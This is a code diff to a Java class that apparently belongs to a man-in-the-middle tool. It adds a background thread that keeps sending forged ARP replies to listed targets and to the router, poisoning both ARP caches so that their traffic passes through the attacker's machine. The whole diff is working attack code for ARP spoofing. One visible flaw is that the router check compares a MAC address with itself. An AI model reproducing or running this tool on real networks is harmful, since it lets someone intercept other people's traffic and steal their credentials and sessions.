@@ -3,6 +3,7 @@ package com.SHGroup.mitm.networking;
 import java.net.Inet4Address;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
+import java.util.ArrayList;
 import java.util.Enumeration;
 
 import org.jnetpcap.Pcap;
@@ -20,7 +21,16 @@ public class ARPSpoofing {
 
 	private boolean isSet = false;
 
+	private ArrayList<Device> targets = new ArrayList<>();
+
+	private ReplyThread t;
+
 	public ARPSpoofing() {
+	}
+
+	public void onExit() {
+		if (t != null)
+			t.stopRun();
 	}
 
 	public void initArpSpoofing() {
@@ -46,24 +56,50 @@ public class ARPSpoofing {
 				}
 			}
 			sendARPRequest();
+
+			t = new ReplyThread();
+			t.setDaemon(true);
+			t.start();
 			isSet = true;
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 	}
 
+	private Device router;
+
+	public Device getRouter() {
+		if (routerIP != null) {
+			if (router == null) {
+				router = new Device(routerMac, routerIP);
+			} else {
+				if (!Utils.bytesToString(router.getMac()).equals(Utils.bytesToString(router.getMac()))) {
+					router = new Device(routerMac, routerIP);
+				}
+			}
+		}
+		return router;
+	}
+
+	public void addTarget(Device d) {
+		if (!targets.contains(d)) {
+			targets.add(d);
+			Main.gui.appendLog("ARP 스푸핑 타겟이 추가되었습니다. : " + d.getNickName());
+		}
+	}
+
 	public void responseARPReply(ARPPacket arp) {
 		if (arp.getOpcode()[0] == 0x00 && arp.getOpcode()[1] == 0x02) { // reply packet
 			if (Utils.bytesToString(arp.getSenderMac()).equals(Utils.bytesToString(localMac))) {
-				Main.gui.appendLog("Send reply packet (to " + Utils.getIPandMACToString(arp.getTargetIP(), arp.getTargetMac()));
+				Main.gui.appendLog(
+						"Send reply packet (to " + Utils.getIPandMACToString(arp.getTargetIP(), arp.getTargetMac()));
 				return;
 			}
 			if (arp.getSenderIP()[3] == 1) {
 				routerIP = arp.getSenderIP();
 				routerMac = arp.getSenderMac();
 
-				Main.gui.appendLog(
-						"Detect router! : " + Utils.getIPandMACToString(routerIP, routerMac));
+				Main.gui.appendLog("Detect router! : " + Utils.getIPandMACToString(routerIP, routerMac));
 			} else {
 				Device d = new Device(arp.getSenderMac(), arp.getSenderIP());
 
@@ -110,5 +146,34 @@ public class ARPSpoofing {
 
 	public boolean isSet() {
 		return isSet;
+	}
+
+	private class ReplyThread extends Thread {
+		private boolean isExit = false;
+
+		@Override
+		public void run() {
+			while (!isExit) {
+				try {
+					if (Main.network.getPcap() != null) {
+						for (Device d : targets) {
+							ARPPacket arp = ARPPacket.generateARPReplyPacket(d.getMac(), localMac, localMac, routerIP,
+									d.getMac(), d.getIP());
+							ARPPacket arp2 = ARPPacket.generateARPReplyPacket(routerMac, localMac, localMac, d.getIP(),
+									routerMac, routerIP);
+							Main.network.getPcap().sendPacket(arp2.generatePacket());
+							Main.network.getPcap().sendPacket(arp.generatePacket());
+						}
+						Thread.sleep(150l);
+					}
+				} catch (Exception ex) {
+					ex.printStackTrace();
+				}
+			}
+		}
+
+		public void stopRun() {
+			this.isExit = true;
+		}
 	}
 }
